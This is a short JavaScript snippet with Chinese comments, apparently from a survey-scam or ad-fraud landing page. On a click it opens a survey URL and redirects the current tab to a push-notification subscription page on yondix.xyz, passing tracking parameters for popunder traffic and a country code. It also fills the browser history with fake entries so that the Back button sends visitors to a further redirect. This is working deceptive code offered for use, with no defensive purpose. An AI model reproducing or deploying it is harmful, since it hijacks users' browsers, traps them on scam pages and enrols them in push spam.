// 定义余量基本功能
const cta = "https://meinungsumfrage.biz/click";
// https://propushlp.com/s/index.html为推送收集的路径 C1是传popunder就写popunder，c2=有具体的国家就传国家
const under = "http://yondix.xyz/DingYue01/index.html?key=540b006d-b2b6-4ed1-b9a1-44a268957b1f&c1=pop&c2=ro";
//  https://propushlp.com/s/index.html为推送收集的路径 C1是传popunder就写bbr，c2=有具体的国家就传国家
const bbURL = "http://yondix.xyz/DingYue01/index.html?key=540b006d-b2b6-4ed1-b9a1-44a268957b1f&c1=BBR&c2=ro";
// pop and click
function gogo() {
	window.onbeforeunload = null;
	window.open(cta);
	document.location.assign(under);
}
// bbr
!function () {
	var a;
	try {
		for (a = 0; 3 > a; ++a) {
			history.pushState({}, "", "#")
		}
		onpopstate = function (c) {
			c.state && location.replace(bbURL)
		}
	} catch (b) { }
}();